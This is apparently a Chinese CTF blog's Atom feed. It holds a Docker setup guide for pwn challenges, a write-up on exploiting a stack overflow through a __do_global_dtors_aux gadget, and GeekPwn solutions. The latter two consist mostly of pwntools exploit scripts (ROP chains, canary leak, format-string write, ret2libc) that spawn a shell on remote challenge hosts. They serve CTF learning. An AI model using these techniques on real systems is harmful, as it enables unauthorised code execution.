<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>eternal</title>
  <icon>https://www.gravatar.com/avatar/3369fb0bbb9338741f76f98838dc8b64</icon>
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2020-11-27T15:54:46.599Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>eternal</name>
    <email>1397239425@qq.com</email>
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>ctf题目环境搭建</title>
    <link href="http://example.com/2020/11/27/ctf%E9%A2%98%E7%9B%AE%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    <id>http://example.com/2020/11/27/ctf%E9%A2%98%E7%9B%AE%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</id>
    <published>2020-11-27T15:46:49.000Z</published>
    <updated>2020-11-27T15:54:46.599Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="关于docker："><a href="#关于docker：" class="headerlink" title="关于docker："></a>关于docker：</h1><p>基本命令：（注意权限问题，没有设置权限组时需要加sudo）</p><p>docker ps -a  查看容器</p><p>docker ps  查看正在运行中的容器</p><p>docker images 查看镜像</p><p>service docker start 启动docker服务</p><p>docker start 容器id 启动一个已经停止的容器</p><p>docker stop 容器id  停止一个已经启动的容器</p><p>docker rm 容器id 删除一个容器</p><p>docker rmi 镜像name 删除本地的一个镜像</p><p>docker run -it 镜像名称 /bin/bash 使用某一镜像来运行容器</p><p>docker run -it 容器id /bin/bash 启动某一容器（退出时容器会关闭）</p><p>docker exec -it 容器id /bin/bash 启动某一容器（退出时容器不会关闭）</p><p>docker export 1e560fca3906(容器id） &gt; ubuntu.tar 导出容器 1e560fca3906 快照到本地文件 ubuntu.tar</p><p>cat docker/ubuntu.tar | docker import - test/ubuntu:v1 使用 docker import 从容器快照文件中再导入为镜像， 将快照文件 ubuntu.tar 导入到镜像 test/ubuntu:v1</p><h2 id="题目环境搭建："><a href="#题目环境搭建：" class="headerlink" title="题目环境搭建："></a>题目环境搭建：</h2><p>使用pwn_deploy_chroot部署是目前最方便最安全的方法。</p><p>已经搭建好docker后，</p><p>安装 docker compose 和 git</p><p>sudo apt install docker-compose git</p><p>把仓库克隆到本地</p><p>git clone <a href="https://github.com/giantbranch/pwn_deploy_chroot.git">https://github.com/giantbranch/pwn_deploy_chroot.git</a></p><p><img src="https://app.yinxiang.com/shard/s30/nl/28827712/12d2c890-8e85-44c3-92f4-a8593d5d0e2a/res/cdcc1460-58fb-4614-8703-7c808b2945db.png?resizeSmall&width=832"></p><p>使用方法：</p><p>1、将所有的pwn题目放入bin目录中</p><p><img src="https://app.yinxiang.com/shard/s30/nl/28827712/12d2c890-8e85-44c3-92f4-a8593d5d0e2a/res/4ed39670-ae81-401c-9e1d-829e6ad66123.png?resizeSmall&width=832"></p><p>2、python initialize.py</p><p><img src="https://app.yinxiang.com/shard/s30/nl/28827712/12d2c890-8e85-44c3-92f4-a8593d5d0e2a/res/e390897a-1231-4fd6-ade2-730dfa7fa561.png?resizeSmall&width=832"></p><p>3、 docker-compose up –build -d</p><p><img src="https://app.yinxiang.com/shard/s30/nl/28827712/12d2c890-8e85-44c3-92f4-a8593d5d0e2a/res/ef97a69d-bae1-4890-9a9e-c41d2d9c9450.png?resizeSmall&width=832"></p><p>用netstat -antp | grep docker查看，确认完成</p><p><img src="https://app.yinxiang.com/shard/s30/nl/28827712/12d2c890-8e85-44c3-92f4-a8593d5d0e2a/res/e14b35e7-dbb1-4b83-9e95-ebbb53ec4f83.png?resizeSmall&width=832"></p><p>可以在 config.py中修改配置。</p><p>You can edit config.py to decide whether to replace /bin/sh with catflag</p><p># Whether to replace /bin/sh</p><p>## replace</p><p>REPLACE_BINSH = True</p><p>## not replace(default)</p><p>REPLACE_BINSH = False</p><p>（__注:此docker可以在一个contain中开启多个题目__）</p><p><strong>注：可以使用以下dockers搭建环境，不过一个contain中只可以开启一个题目，常适用与当前ctf比赛环境的搭建</strong></p><p>链接：<a href="https://github.com/CTFTraining/HuXiang_2019_pwn_HackNote/">https://github.com/CTFTraining/HuXiang_2019_pwn_HackNote/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="环境搭建" scheme="http://example.com/categories/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    
    
    <category term="ctf" scheme="http://example.com/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>无输出操作之__do_global_dtors_aux</title>
    <link href="http://example.com/2020/11/27/%E6%97%A0%E8%BE%93%E5%87%BA%E6%93%8D%E4%BD%9C%E4%B9%8B-do-global-dtors-aux/"/>
    <id>http://example.com/2020/11/27/%E6%97%A0%E8%BE%93%E5%87%BA%E6%93%8D%E4%BD%9C%E4%B9%8B-do-global-dtors-aux/</id>
    <published>2020-11-27T15:32:42.000Z</published>
    <updated>2020-11-27T15:41:30.717Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>__do_global_dtors_aux中有一个gadget可以修改stack上的数据。</p><p><img src="https://app.yinxiang.com/shard/s30/nl/28827712/805a108f-d974-464e-b42c-e564565b7ac6/res/32237652-2a21-451b-8fcb-d5f78b9ccbc1.png?resizeSmall&width=832"></p><p>add [rbp-3Dh],ebx（当rbp和ebx可控时，我们就可以修改rbp-0x3d地址里面的内容，从而获取想要的真实地址。）</p><p><img src="https://app.yinxiang.com/shard/s30/nl/28827712/805a108f-d974-464e-b42c-e564565b7ac6/res/bb3fdb13-aa59-497a-a2aa-b917cfed716d.png?resizeSmall&width=832"></p><p><img src="https://app.yinxiang.com/shard/s30/nl/28827712/805a108f-d974-464e-b42c-e564565b7ac6/res/c3f3325b-ae68-4ac9-a2e1-8882915358d3.png?resizeSmall&width=832"></p><p><img src="https://app.yinxiang.com/shard/s30/nl/28827712/805a108f-d974-464e-b42c-e564565b7ac6/res/4b52e070-14fd-45b0-a2b6-af90246d6545.png?resizeSmall&width=832"></p><p>nx保护，got表不可改。栈溢出，并且没有任何可输出的函数。首先想到的是利用dl_runtime_reslove,但是dl_runtime_reslove常用于32，并且实操后发现执行不通。</p><p>利用思路：<br> 1、迁移到bss段<br> 2、调用libc_start_main，使得bss上残留下原本栈的信息，就会有真实地址在bss上分布。<br> 3、找到一个能用的真实地址，利用神奇的gadget，把他伪造成system，再次跳回到main函数。<br> 4、栈溢出构造system(‘/bin/sh’)</p><p><strong>exp:</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">pwn_name = <span class="string">&quot;no_leak&quot;</span></span><br><span class="line">arch = <span class="string">&#x27;64&#x27;</span></span><br><span class="line">version = <span class="string">&#x27;2.27&#x27;</span></span><br><span class="line">ip, port = <span class="string">&#x27;nc.eonew.cn&#x27;</span>, <span class="number">10002</span></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>]==<span class="string">&quot;l&quot;</span>:</span><br><span class="line">p=process(<span class="string">&#x27;./&#x27;</span>+pwn_name)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>,checksec=<span class="literal">False</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p=remote(ip,port)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>,checksec=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(pwn_name,checksec=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_one</span>():</span></span><br><span class="line">    <span class="keyword">if</span>(arch == <span class="string">&#x27;64&#x27;</span>):</span><br><span class="line">        <span class="keyword">if</span>(version == <span class="string">&#x27;2.23&#x27;</span>):</span><br><span class="line">            one = [<span class="number">0x45216</span>, <span class="number">0x4526a</span>, <span class="number">0xf02a4</span>, <span class="number">0xf1147</span>]</span><br><span class="line">        <span class="keyword">if</span> (version == <span class="string">&#x27;2.27&#x27;</span>):</span><br><span class="line">            one = [<span class="number">0x4f2c5</span> , <span class="number">0x4f322</span> , <span class="number">0x10a38c</span>]</span><br><span class="line">    <span class="keyword">return</span> one</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sym</span>(<span class="params">func</span>):</span></span><br><span class="line">    success(<span class="string">&#x27;&#123;&#125; =&gt; &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(func , libc.sym[func]))</span><br><span class="line">    <span class="keyword">return</span> libc.sym[func]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">info</span>(<span class="params">con,leak</span>):</span></span><br><span class="line">    success(<span class="string">&#x27;&#123;&#125; =&gt; &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(con,leak))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>(<span class="params">address=<span class="number">0</span></span>):</span></span><br><span class="line">    <span class="keyword">if</span> address==<span class="number">0</span>:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> address &gt; <span class="number">0xfffff</span>:</span><br><span class="line">            script=<span class="string">&quot;b *&#123;:#x&#125;\nc\n&quot;</span>.<span class="built_in">format</span>(address)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            script=<span class="string">&quot;b *$rebase(&#123;:#x&#125;)\nc\n&quot;</span>.<span class="built_in">format</span>(address)</span><br><span class="line">        gdb.attach(p, script)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cus_rop</span>(<span class="params">gadget1,gadget2,func_got,rdi,rsi,rdx</span>):</span></span><br><span class="line">    payload = p64(gadget1)</span><br><span class="line">    payload += p64(<span class="number">0</span>) </span><br><span class="line">    payload += p64(<span class="number">0</span>)         <span class="comment">#rbx=0</span></span><br><span class="line">    payload += p64(<span class="number">1</span>)         <span class="comment">#rbp=1</span></span><br><span class="line">    payload += p64(func_got)  <span class="comment">#r12  call</span></span><br><span class="line">    payload += p64(rdi)       <span class="comment">#r13  rdx </span></span><br><span class="line">    payload += p64(rsi)       <span class="comment">#r14  rsi</span></span><br><span class="line">    payload += p64(rdx)       <span class="comment">#r15  edi </span></span><br><span class="line">    payload += p64(gadget2)</span><br><span class="line">    payload += <span class="string">&#x27;a&#x27;</span>*<span class="number">56</span>      <span class="comment">#tiao zheng zhan zhen</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line">one = get_one()</span><br><span class="line"></span><br><span class="line">gadget_reg = <span class="number">0x4005C6</span> </span><br><span class="line">gadget_call= <span class="number">0x4005B0</span></span><br><span class="line">magic_gadget = <span class="number">0x400518</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x4005D3</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x4005D1</span></span><br><span class="line">leave_ret = <span class="number">0x400564</span></span><br><span class="line">buf_address = elf.bss() + <span class="number">0x500</span></span><br><span class="line">fini = <span class="number">0x4005E0</span></span><br><span class="line">init = <span class="number">0x400570</span></span><br><span class="line">start = <span class="number">0x400450</span></span><br><span class="line"><span class="comment">#---------------</span></span><br><span class="line"></span><br><span class="line">payload  = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x80</span> + p64(buf_address)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rsi_r15) + p64(buf_address) + p64(<span class="number">0</span>) + p64(elf.plt[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">payload += p64(leave_ret)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># dbg(0x40055A)</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">8</span></span><br><span class="line">payload += cus_rop(gadget_reg,gadget_call,elf.got[<span class="string">&#x27;__libc_start_main&#x27;</span>],start,fini,init)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"><span class="comment">#--------------- s</span></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">payload  = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x80</span> + p64(buf_address)</span><br><span class="line">payload += p64(<span class="number">0x4005Ca</span>)</span><br><span class="line">payload += p64(<span class="number">0xFFFFFFFFFFC5EE18</span>) <span class="comment">##(-0x3a11e8)^0xffffffffffffffff+1</span></span><br><span class="line">payload += p64(<span class="number">0x601458</span>+<span class="number">0x3d</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">4</span></span><br><span class="line">payload += p64(magic_gadget)</span><br><span class="line">payload += p64(start)</span><br><span class="line">p.send(payload)</span><br><span class="line">pause()</span><br><span class="line"><span class="comment">#--------------- </span></span><br><span class="line">binsh = <span class="number">0x6012b0</span></span><br><span class="line">system = <span class="number">0x601458</span></span><br><span class="line">payload =<span class="string">&#x27;/bin/sh\x00&#x27;</span>+<span class="string">&#x27;b&#x27;</span>*<span class="number">0x80</span></span><br><span class="line">payload +=cus_rop(gadget_reg,gadget_call,system,binsh,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line"><span class="comment"># payload =&#x27;/bin/sh\x00&#x27;+&#x27;b&#x27;*0x80</span></span><br><span class="line"><span class="comment"># payload += p64(pop_rdi_ret)+p64(binsh)+p64(system)不可行方案</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>第一次payload：<br> 栈迁移之后再次ret到read函数。此时rbp已经被覆盖为bss段地址，并且再次执行read函数</p><p><img src="https://app.yinxiang.com/shard/s30/nl/28827712/805a108f-d974-464e-b42c-e564565b7ac6/res/4e725dd7-1884-406e-9110-117479dfbd50.png?resizeSmall&width=832"></p><p><img src="https://app.yinxiang.com/shard/s30/nl/28827712/805a108f-d974-464e-b42c-e564565b7ac6/res/baaadd9f-9a1a-4778-9e4c-20894f5b14d8.png?resizeSmall&width=832"></p><p>第二次payload：<br> 栈迁移往0x601510处读入我们调用libc_start_main的payload。<br> 通用gadget  <strong>—csu—</strong> ：</p><p><img src="https://app.yinxiang.com/shard/s30/nl/28827712/805a108f-d974-464e-b42c-e564565b7ac6/res/898fb6cd-dd9d-4786-b14a-b72e539ddfe7.png?resizeSmall&width=832"></p><p><img src="https://app.yinxiang.com/shard/s30/nl/28827712/805a108f-d974-464e-b42c-e564565b7ac6/res/c76cd30e-c636-48ce-b765-821fa4bb9808.png?resizeSmall&width=832"></p><p><img src="https://app.yinxiang.com/shard/s30/nl/28827712/805a108f-d974-464e-b42c-e564565b7ac6/res/542d252a-2c0f-46a0-9164-052f7f96f7db.png?resizeSmall&width=832"></p><p><img src="https://app.yinxiang.com/shard/s30/nl/28827712/805a108f-d974-464e-b42c-e564565b7ac6/res/915b21c2-607f-4f01-97a0-afc7958f77ab.png?resizeSmall&width=832"></p><p><img src="https://app.yinxiang.com/shard/s30/nl/28827712/805a108f-d974-464e-b42c-e564565b7ac6/res/e4e6f651-d047-4279-9b94-fa95f2383633.png?resizeSmall&width=832"></p><p>可以看到第一个参数main地址，利用中级栈溢出的方式，成功实现了调用libc_start_main。</p><p><img src="https://app.yinxiang.com/shard/s30/nl/28827712/805a108f-d974-464e-b42c-e564565b7ac6/res/4da41e36-719c-4d85-857d-a8fd7b457c28.png?resizeSmall&width=832"></p><p>第三次payload：<br> 再次read，当我们进去看时，就会发现除了我们的再次输入外，在bss上留下还有一些libc的地址：</p><p>选择0x601458作为我们的牺牲品，通过神奇的gadget，add它和system的偏移，就可以把它改成system，同时它的bss地址可以看成是system的伪got表地址。</p><p><img src="https://app.yinxiang.com/shard/s30/nl/28827712/805a108f-d974-464e-b42c-e564565b7ac6/res/9e775d23-28f1-4f98-b4db-9a34cc3be6ee.png?resizeSmall&width=832"></p><p>关于偏移：<br> 在magic_gadget中，add[rbp-0x3d],所以我们0x601458只有加0x3d才是rbp的位置，才能控制rbp。</p><p><img src="https://app.yinxiang.com/shard/s30/nl/28827712/805a108f-d974-464e-b42c-e564565b7ac6/res/2fbb014a-ef6d-45b3-a366-1a9d350ae072.png?resizeSmall&width=832"></p><p><img src="https://app.yinxiang.com/shard/s30/nl/28827712/805a108f-d974-464e-b42c-e564565b7ac6/res/218526fd-85ad-4e93-bb71-79763279bb18.png?resizeSmall&width=832"></p><p>第四次payload：<br> 改成功了，接着再次回到main函数，直接写binsh到首部，然后中级栈溢出调用system就可以getshell了：</p><p><img src="https://app.yinxiang.com/shard/s30/nl/28827712/805a108f-d974-464e-b42c-e564565b7ac6/res/9ed5fd14-4005-4569-b578-10f66a15826d.png?resizeSmall&width=832"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="__do_global_dtors_aux" scheme="http://example.com/categories/do-global-dtors-aux/"/>
    
    
    <category term="pwn" scheme="http://example.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>Geekpwn_pwn_writeup</title>
    <link href="http://example.com/2020/11/27/Geekpwn-pwn-writeup/"/>
    <id>http://example.com/2020/11/27/Geekpwn-pwn-writeup/</id>
    <published>2020-11-27T05:06:17.000Z</published>
    <updated>2020-11-27T05:16:59.821Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="jichu"><a href="#jichu" class="headerlink" title="jichu"></a>jichu</h2><p><strong>exp:</strong> </p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line"></span><br><span class="line">p&#x3D;remote(&#39;172.18.0.1&#39;,10000)</span><br><span class="line">#p&#x3D;process(&#39;.&#x2F;jichu&#39;)</span><br><span class="line">elf&#x3D;ELF(&#39;.&#x2F;jichu&#39;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh&#x3D;0x080482ea</span><br><span class="line">system&#x3D;elf.symbols[&#39;system&#39;]</span><br><span class="line"></span><br><span class="line">payload&#x3D;&#39;a&#39;*0x48+&#39;aaaa&#39;+p32(system)+p32(0xdeadbeef)+p32(sh)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(&#39;Please input admin password:&#39;,&#39;administrator&#39;)</span><br><span class="line">p.sendline(&#39;1&#39;)</span><br><span class="line">p.sendlineafter(&#39;Please input new log info:&#39;,payload)</span><br><span class="line">p.sendline(&#39;4&#39;)</span><br><span class="line">p.sendline(&#39;cat flag&#39;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="pwn00"><a href="#pwn00" class="headerlink" title="pwn00"></a>pwn00</h2><p><strong>exp:</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> #coding&#x3D;utf-8</span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import*</span><br><span class="line">context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line"></span><br><span class="line">if args[&#39;REMOTE&#39;]:</span><br><span class="line">    p &#x3D; remote(&#39;81.69.0.47&#39;,1000)</span><br><span class="line">else:</span><br><span class="line">    p &#x3D; process(&quot;.&#x2F;pwn00&quot;)</span><br><span class="line"></span><br><span class="line">pop_ret&#x3D;0x0000000000400813</span><br><span class="line">def main():</span><br><span class="line">p.recvuntil(&quot;Do you want to play with me?\n&quot;)</span><br><span class="line">payload&#x3D;&#39;a&#39;*0x70+&#39;aaaaaaaa&#39;+p64(pop_ret)+p64(0x4008B5)+p64(0x4007A2)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">main()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="baby-canary"><a href="#baby-canary" class="headerlink" title="baby_canary"></a>baby_canary</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> #coding&#x3D;utf-8</span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import*</span><br><span class="line">context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line"></span><br><span class="line">if args[&#39;REMOTE&#39;]:</span><br><span class="line">    p &#x3D; remote(&#39;81.69.0.47&#39;,3333)</span><br><span class="line">else:</span><br><span class="line">    p &#x3D; process(&quot;.&#x2F;baby_canary&quot;)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret&#x3D;0x400873</span><br><span class="line"># bin_sh&#x3D;0x00000000004008ee</span><br><span class="line">bin_sh&#x3D;0x00000000004008ED</span><br><span class="line">system&#x3D;0x4007FC</span><br><span class="line">def main():</span><br><span class="line">p.recvuntil(&#39;plz tell me.\n&#39;)</span><br><span class="line">payload&#x3D;&#39;a&#39;*0x68</span><br><span class="line"># gdb.attach(p)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(&#39;a&#39;*0x68)</span><br><span class="line">canary&#x3D;u64(p.recv(8).ljust(8,&quot;\x00&quot;))-0xa</span><br><span class="line">print hex(canary)</span><br><span class="line">payload&#x3D;&#39;a&#39;*0x68+p64(canary)+p64(0)+p64(pop_rdi_ret)+p64(bin_sh)+p64(system)</span><br><span class="line">p.send(payload)</span><br><span class="line"># p.recv()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">main()</span><br></pre></td></tr></table></figure><h2 id="fmt"><a href="#fmt" class="headerlink" title="fmt"></a>fmt</h2><p><strong>exp:</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">exp：</span><br><span class="line">#coding&#x3D;utf-8</span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import*</span><br><span class="line">context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line"></span><br><span class="line">if args[&#39;REMOTE&#39;]:</span><br><span class="line">    p &#x3D; remote(&#39;81.69.0.47&#39;, 2222)</span><br><span class="line">else:</span><br><span class="line">    p &#x3D; process(&quot;.&#x2F;fmt&quot;)</span><br><span class="line"></span><br><span class="line">elf&#x3D;ELF(&#39;.&#x2F;fmt&#39;)</span><br><span class="line">system&#x3D;0x4012DB</span><br><span class="line"></span><br><span class="line">system_plt&#x3D;elf.plt[&#39;system&#39;]</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">p.recvuntil(&#39;hello world!&#39;)</span><br><span class="line">bss&#x3D;0x40409C</span><br><span class="line">payload&#x3D;&#39;%&#39;+str(0x1000)+&#39;c%12$hn&#39;+&#39;%&#39;+str(0x1000)+&#39;c%13$hn&#39;+&#39;\x00&#39;*8+p64(bss)+p64(bss+2)  &#x2F;&#x2F;格式化字符串写入操作</span><br><span class="line">修改seed地址后两字节        修改seed地址前两字节                       两字节两字节修改的bss段安排</span><br><span class="line"># gdb.attach(p,&#39;b *0x401261\nc\n&#39;)</span><br><span class="line"></span><br><span class="line"># gdb.attach(p)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">sleep(1)</span><br><span class="line">a&#x3D;[&#39;2121385791&#39;,&#39;1417272958&#39;,&#39;1222019344&#39;,&#39;189308997&#39;,&#39;2113086160&#39;,&#39;43315344&#39;,&#39;1978613629&#39;,&#39;710758478&#39;,&#39;1825758792&#39;,&#39;118621091&#39;,&#39;1330609383&#39;,&#39;97980547&#39;,&#39;203100239&#39;,&#39;120334289&#39;,&#39;1085921916&#39;,&#39;75582125&#39;]</span><br><span class="line">print(len(a))</span><br><span class="line">for i in range(0,len(a)):</span><br><span class="line">p.sendline(a[i])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(&quot;running sh&quot;)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">main()</span><br></pre></td></tr></table></figure><h2 id="pwn111"><a href="#pwn111" class="headerlink" title="pwn111"></a>pwn111</h2><p><strong>exp:</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> #coding&#x3D;utf-8</span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import*</span><br><span class="line"># context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line"></span><br><span class="line">if args[&#39;REMOTE&#39;]:</span><br><span class="line">    p &#x3D; remote(&#39;81.69.0.47&#39;, 1122)</span><br><span class="line">else:</span><br><span class="line">    p &#x3D; process(&quot;.&#x2F;pwn111&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">libc&#x3D;ELF(&#39;.&#x2F;libc&#39;)</span><br><span class="line">elf&#x3D;ELF(&#39;.&#x2F;pwn111&#39;)</span><br><span class="line">pop_rbp_ret&#x3D;0x000000000040112d</span><br><span class="line">pop_rdi_ret&#x3D;0x0000000000401233</span><br><span class="line">write_plt&#x3D;elf.plt[&#39;write&#39;]</span><br><span class="line">libc_start_main_got&#x3D;elf.got[&#39;__libc_start_main&#39;]</span><br><span class="line"></span><br><span class="line">#libc中的基地址</span><br><span class="line">bin_sh_libc&#x3D;next(libc.search(&quot;&#x2F;bin&#x2F;sh&quot;))                     #0x0000000000180544</span><br><span class="line">system_libc&#x3D;libc.symbols[&#39;system&#39;]</span><br><span class="line">print hex(bin_sh_libc)</span><br><span class="line">print hex(system_libc)</span><br><span class="line"></span><br><span class="line">#函数的偏移offset</span><br><span class="line">libc_start_main_offset&#x3D;libc.symbols[&#39;__libc_start_main&#39;]</span><br><span class="line"></span><br><span class="line">p.recvuntil(&quot;please input: &quot;)</span><br><span class="line"></span><br><span class="line"># gdb.attach(p)</span><br><span class="line">main&#x3D;0x0000000000401146</span><br><span class="line">rsi_r15_ret&#x3D;0x0000000000401231</span><br><span class="line">r14_r15_ret&#x3D;0x0000000000401230</span><br><span class="line">payload1&#x3D;&#39;a&#39;*0x88+p64(pop_rdi_ret)+p64(1)+p64(rsi_r15_ret)+p64(libc_start_main_got)+p64(0)+p64(write_plt)+p64(main)</span><br><span class="line"></span><br><span class="line">p.sendline(payload1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#打印出write()函数在got表中的地址</span><br><span class="line">libc_start_main_add&#x3D;u64(p.recv(6).ljust(8,&quot;\x00&quot;))</span><br><span class="line"></span><br><span class="line">print &quot;libc_start_main_add&#x3D;&quot;+hex(libc_start_main_add)</span><br><span class="line">offset&#x3D;libc_start_main_add-libc_start_main_offset</span><br><span class="line">system_add&#x3D;offset+system_libc</span><br><span class="line">bin_sh_add&#x3D;offset+bin_sh_libc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">payload2&#x3D;&#39;a&#39;*0x80+&#39;a&#39;*8+p64(pop_rdi_ret)+p64(bin_sh_add)+p64(system_add)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">main()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="GeekPwn" scheme="http://example.com/categories/GeekPwn/"/>
    
    
    <category term="pwn" scheme="http://example.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>Geekpwn Pwn222</title>
    <link href="http://example.com/2020/11/26/GeekPwn-pwn222/"/>
    <id>http://example.com/2020/11/26/GeekPwn-pwn222/</id>
    <published>2020-11-26T10:17:48.000Z</published>
    <updated>2020-11-26T10:17:48.891Z</updated>
    
